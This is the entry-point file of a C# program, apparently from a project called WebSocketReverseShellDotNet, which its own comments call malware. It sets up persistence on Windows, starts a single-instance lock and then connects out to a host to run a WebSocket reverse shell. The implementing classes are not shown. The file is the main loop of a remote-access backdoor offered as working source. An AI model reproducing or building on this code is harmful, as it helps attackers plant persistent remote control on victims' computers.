// See https://aka.ms/new-console-template for more information
using OfficeOpenXml;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using WebSocketReverseShellDotNet.service.impl;
using System.Windows.Forms;
using WebSocketReverseShellDotNet.service.commands;
using WebSocketReverseShellDotNet.utils;




ExcelPackage.LicenseContext = LicenseContext.NonCommercial;


// try to establish a persistent in the system
PersistsMalware.CreatePersistenceWindows();
// initiate lock mechanism to prevent malware from being used more than once
LockMechanismUtil.StartLockMechanism();


// start the malware
WebSocketClient.ConnectToHost();


Environment.Exit(0);





